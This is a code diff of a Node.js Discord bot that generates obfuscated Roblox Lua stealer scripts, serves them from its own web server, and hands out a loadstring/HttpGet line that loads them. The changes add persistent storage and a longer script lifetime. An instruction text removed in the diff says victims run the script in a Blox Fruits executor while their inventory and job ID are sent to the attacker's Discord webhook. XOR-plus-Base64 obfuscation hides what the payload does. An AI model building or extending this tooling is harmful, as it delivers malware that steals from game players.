@@ -6,40 +6,65 @@ const express = require('express');
 const { v4: uuidv4 } = require('uuid');
 require('dotenv').config();
 
-// ----- Global script store (in‑memory) -----
-const scripts = new Map(); // id -> { content, expires }
-const SCRIPT_TTL = 60 * 60 * 1000; // 1 hour
+// ----- Persistent script store -----
+const STORE_FILE = path.join(__dirname, 'scripts.json');
+const SCRIPT_TTL = 24 * 60 * 60 * 1000; // 24 hours
+
+// Load existing scripts from disk
+let scripts = new Map();
+if (fs.existsSync(STORE_FILE)) {
+    try {
+        const data = JSON.parse(fs.readFileSync(STORE_FILE, 'utf8'));
+        const now = Date.now();
+        for (const [id, entry] of Object.entries(data)) {
+            if (now < entry.expires) {
+                scripts.set(id, entry);
+            }
+        }
+        console.log(`✅ Loaded ${scripts.size} active scripts from disk.`);
+    } catch (e) {
+        console.warn('⚠️ Failed to load scripts.json, starting fresh.');
+    }
+}
+
+// Save function
+function saveScripts() {
+    const obj = Object.fromEntries(scripts);
+    fs.writeFileSync(STORE_FILE, JSON.stringify(obj, null, 2));
+}
+
+// Clean expired and save periodically
+setInterval(() => {
+    const now = Date.now();
+    let changed = false;
+    for (const [id, entry] of scripts) {
+        if (now > entry.expires) {
+            scripts.delete(id);
+            changed = true;
+        }
+    }
+    if (changed) saveScripts();
+}, 10 * 60 * 1000);
 
 // ----- Web server -----
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Serve obfuscated scripts
 app.get('/script/:id', (req, res) => {
     const id = req.params.id;
     const entry = scripts.get(id);
     if (!entry || Date.now() > entry.expires) {
         scripts.delete(id);
+        saveScripts();
         return res.status(404).send('Script not found or expired.');
     }
     res.set('Content-Type', 'text/plain');
     res.send(entry.content);
 });
 
-// Health check
 app.get('/', (req, res) => res.send('Bot is alive!'));
 
 app.listen(PORT, () => console.log(`✅ Web server running on port ${PORT}`));
-
-// ----- Cleanup expired scripts every 10 minutes -----
-setInterval(() => {
-    const now = Date.now();
-    for (const [id, entry] of scripts) {
-        if (now > entry.expires) {
-            scripts.delete(id);
-        }
-    }
-}, 10 * 60 * 1000);
 
 // ----- Self‑ping (keep Render awake) -----
 const RENDER_URL = process.env.RENDER_URL;
@@ -107,7 +132,7 @@ client.on('interactionCreate', async interaction => {
         template = template.replace(/\{\{WEBHOOK\}\}/g, webhook);
         template = template.replace(/\{\{USERNAME\}\}/g, username);
 
-        // ----- Obfuscate locally (XOR + Base64) -----
+        // ----- Obfuscate locally -----
         const obfuscated = obfuscateScript(template);
 
         // ----- Store script with unique ID -----
@@ -116,8 +141,9 @@ client.on('interactionCreate', async interaction => {
             content: obfuscated,
             expires: Date.now() + SCRIPT_TTL
         });
+        saveScripts();
 
-        // ----- Build loadstring (points to this bot) -----
+        // ----- Build loadstring -----
         const baseUrl = RENDER_URL || `http://localhost:${PORT}`;
         const loadstringLine = `loadstring(game:HttpGet("${baseUrl}/script/${id}"))()`;
 
@@ -133,13 +159,13 @@ client.on('interactionCreate', async interaction => {
                     inline: false 
                 },
                 { 
-                    name: '🔒 Obfuscation', 
-                    value: 'XOR + Base64 (lightweight, no external API)',
+                    name: '⏳ Script Expires', 
+                    value: `In 24 hours (or until bot restarts)`,
                     inline: false 
                 },
                 { 
-                    name: '📌 Instructions', 
-                    value: 'Paste the loadstring above into a Blox Fruits executor and run it. The victim will see the loading screen, and you\'ll get their inventory + job ID in your webhook.',
+                    name: '🔒 Obfuscation', 
+                    value: 'XOR + Base64 (lightweight)',
                     inline: false 
                 }
             )
@@ -147,7 +173,7 @@ client.on('interactionCreate', async interaction => {
 
         await interaction.editReply({ embeds: [embed] });
 
-        // ----- Self‑ping after command -----
+        // ----- Self‑ping -----
         if (RENDER_URL) {
             axios.get(RENDER_URL).catch(() => {});
         }
@@ -158,21 +184,14 @@ client.on('interactionCreate', async interaction => {
     }
 });
 
-// ----- Local obfuscator (XOR + Base64) -----
+// ----- Local obfuscator -----
 function obfuscateScript(raw) {
-    // 1. Generate random XOR key (1-255)
     const key = Math.floor(Math.random() * 254) + 1;
-
-    // 2. XOR encode the entire script
     let xorEncoded = '';
     for (let i = 0; i < raw.length; i++) {
         xorEncoded += String.fromCharCode(raw.charCodeAt(i) ^ key);
     }
-
-    // 3. Base64 encode the XORed string
     const base64 = Buffer.from(xorEncoded, 'binary').toString('base64');
-
-    // 4. Build a loader that decodes and runs it
     return `-- Obfuscated with XOR + Base64
 local function decode(str, key)
     local result = ""
